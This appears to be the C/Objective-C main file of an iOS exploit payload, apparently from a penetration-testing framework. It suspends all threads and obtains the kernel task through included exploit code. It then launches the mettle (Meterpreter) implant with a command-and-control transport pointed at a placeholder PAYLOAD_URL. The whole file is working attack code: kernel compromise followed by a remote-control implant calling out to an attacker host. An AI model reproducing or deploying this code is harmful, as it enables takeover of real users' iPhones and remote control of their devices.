#import <UIKit/UIKit.h>

#include "arch.h"
#include "exploit64.h"
#include "nvpatch.h"
#include "set.h"

#include <mettle.h>

void suspend_all_threads() {
    thread_act_t other_thread, current_thread;
    unsigned int thread_count;
    thread_act_array_t thread_list;

    current_thread = mach_thread_self();
    int result = task_threads(mach_task_self(), &thread_list, &thread_count);
    if (result == -1) {
        exit(1);
    }
    if (!result && thread_count) {
        for (unsigned int i = 0; i < thread_count; ++i) {
            other_thread = thread_list[i];
            if (other_thread != current_thread) {
                int kr = thread_suspend(other_thread);
                if (kr != KERN_SUCCESS) {
                    mach_error("thread_suspend:", kr);
                    exit(1);
                }
            }
        }
    }
}

const char payload_url[256] = "PAYLOAD_URL";

void start_mettle()
{
  struct mettle *m = mettle();
  if (m == NULL) {
    return;
  }

  c2_add_transport_uri(mettle_get_c2(m), payload_url);

  mettle_start(m);
  mettle_free(m);
}

int main(int argc, char * argv[]) {
  suspend_all_threads();

  vm_address_t kbase = 0;
  task_t kernel_task = get_kernel_task(&kbase);

  start_mettle();

  return 0;
}


